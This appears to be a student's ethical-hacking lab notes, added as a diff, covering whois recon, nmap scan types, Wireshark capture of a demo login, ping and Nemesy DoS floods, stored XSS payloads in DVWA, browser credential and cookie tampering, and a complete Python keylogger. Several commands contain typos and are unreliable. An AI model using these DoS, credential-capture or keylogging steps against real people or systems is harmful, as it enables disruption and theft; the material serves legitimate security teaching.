@@ -1,0 +1,125 @@
+Practical 1:: Use Google and Whois for Reconnaisasance.
+
+1. open who.is website
+2. Enter the website name and hit the “Enter button”.
+3. Show you information about www.prestashop.com.
+
+---------------------------------------------------------------------------
+---------------------------------------------------------------------------
+
+Practical 2.1:: Password encrypt and decrypt using CryptTool
+
+Step 1: Click on File tab-> New, Type any text to encrypt.
+Step 2: Click on Encrypt/Decrypt tab Click Symmetric (modern)RC4Enter any key(Remember it)Click on Encrypt
+
+	Youll get a encrypted form of the text which will look like 0000 36A 5B 7Q 99Y etc.
+
+Step 3: For Decryption again click on encrypt/Decrypt tab Symmetric(modern) RC4 enter same key 
+Click on Decrypt.
+
+	Youll get a encrypted form of the text
+
+2.2 Password Cracking and Wireless Network Password Decoding using cain and abel.
+
+Open docfile at github.com/aditya728/Practicals
+
+---------------------------------------------------------------------------
+---------------------------------------------------------------------------
+
+prac 3:: Using TraceRoute, ping, ifconfig, netstat Command Analysis Network
+
+open cmd and run as administrator >> type tracert www.prestashop.com 
+>> copy all IP addresses that you got in step 1 >> ping the IP adresses
+
+open vmware >> open virtual machine >> ubuntu >> terminal >> type ifconfig
+ >> then netstat and press enter
+
+---------------------------------------------------------------------------
+---------------------------------------------------------------------------
+
+prac 4:: Using Nmap scanner to perform port scanning of various forms ACK, SYN, FIN, NULL, XMAS
+
+open zenmap >>       in target box type "scanme.nmap.org" >> 
+	      (ACK)  in command box type "nmap -sA -T4 scanme.nmap.org" >> enter
+	      (SYN)  in command box type "nmap -p22,113,139 scanme.nmap.org" >> enter
+	      (FIN)  in command box type "nmap -sF scanme.nmap.org" >> enter
+	      (NULL SCAN) in command box type "nmap -sN -p22 scanme.nmap.org" >> enter
+	      (XMAS) in command box type "nmap -sX sccanme.nmap.org" >> enter
+
+---------------------------------------------------------------------------
+---------------------------------------------------------------------------
+
+prac 5:: Network Traffic Capture with Wireshark and DoS Attack using Nemesy
+
+open wire shark >> click on ethernet >> click on start capture(find😁)>> open chrome >> type zerobank.com >> enter login details >> click on sign in >> now go back to wireshark and click on stop capturing >> type http in search box >> type "http" in search box >> search (manually) for POST method >> click on it expand "HTML form URL encoded" >> you will get userID and password of the site
+
+dos attack using cmd >> open cmd >> type "ipconfig" >> copy the IPv4 address and paste it in notepad >> 
+then type "ping 10.128.131.108 -t-1 65500
+
+dos attack nemesy >> turn off antivirus securities and firewalls >> download nemesy from  http://packetstormsecurity.com/files/25599/nemesy13.zip.html
+unzip and run the program nemesy.exe >> paste the copied IP adress in the victim IP box >> 
+number=0, size=65000 & delay(ms)=100 >> click on send >> to check the effects of the packets open task manager and click on networking and check (manually) the graph
+
+---------------------------------------------------------------------------
+---------------------------------------------------------------------------
+
+Practical No. 06:: Persistent Cross-Site Scripting Attack.
+
+Step 1: Open XAMPP Server.
+
+Step 02: Start modules apache and mysql. if error is given then go to
+config(apache)—>select apache(httpd.conf)—>change Listen and localhost as 8080—>save the file.
+Then select apache (httpd-ssl.conf)—>change Listen as 4430—>save the file -> start the module.
+
+Step 3: Go to site localhost:8080/DVWA/login.php and enter username: admin and password: password.
+
+Step 4: go to home page.
+
+Step 5: Click on xss(stored).
+
+Step 6: Give name: test 1 and message: "<script>alert(“this is xss file”)</script>" and click on 'sign guestbook'.
+
+Step 7: Give name:test 2 and message: "<script>alert(document.cookie)</script>" and click on 'sign guestbook'.
+
+	As per docfile, your output will be a pop up with "OK" button with 'security=low, PHPSESSID=c9734tynh8'
+
+
+
+---------------------------------------------------------------------------
+---------------------------------------------------------------------------
+
+prac 7:: Session impersonation using Firefox and Tamper Data add-on.
+
+open firefox >> click on "add-on" >> click on "extension" >> search "tampering data" >> click on "add-on firefox" >> click to "add" >> click on "ok" >> open brower search for facebook >> click on tampering button (find) >> mark "main_frame", "xmlhttprequest" >> click on "yes" >> enter usernname & password >> refresh the pg  and username and password is captured 
+
+using cookie tampering data >> open firefox >> goto tools >> click on "add on" >> click on "extension" >> search cookie editor >> select "cookie editor" >> click on "cookie editor" >> click on "add button" >> click on "ok button" >> now you can see the cookie editor extension >> go to https://the-internet.herokuapp.com/login >> enter username=tomsmith and password= SuperSecretPassword>> click on "login" >> click on "cookie icon" >> click on "add new cookie" symbol give name and value >> select the cookie and click on export/ export arrow >> open the eported file in microsoft word >> the end
+
+-------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------
+
+Practical No. 08:: Create a simple keylogger using python
+
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG,
+format='%(asctime)s:%(message)s:')
+
+def on_press(key):
+ logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+ listener.join()
+
+
+
+
+
+
+
+
+
+
+
